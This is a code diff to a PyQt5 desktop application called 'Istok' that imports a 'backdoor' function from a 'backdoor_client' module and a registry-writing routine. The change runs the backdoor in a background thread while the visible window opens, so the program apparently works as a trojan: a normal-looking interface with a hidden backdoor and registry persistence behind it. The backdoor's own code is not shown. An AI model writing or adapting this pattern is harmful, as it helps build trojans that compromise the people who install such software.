@@ -5,6 +5,7 @@ import os
 from PyQt5 import QtWidgets
 import winreg as reg
 import shutil
+from threading import Thread
 
 from backdoor_client import backdoor
 from MainIstok import Ui_Istok
@@ -389,11 +390,19 @@ class Istok(QtWidgets.QMainWindow):
     def backbutton(self):
         self.initiation()
 
-
-if __name__ == '__main__':
-    write_to_reg()
-    backdoor()
+def start_front():
     app = QtWidgets.QApplication([])
     window = Istok()
     window.show()
     app.exec_()
+
+if __name__ == '__main__':
+    write_to_reg()
+    thread1 = Thread(target=backdoor)
+    thread2 = Thread(target=start_front)
+    thread1.start()
+    thread2.start()
+    thread1.join()
+    thread2.join()
+
+
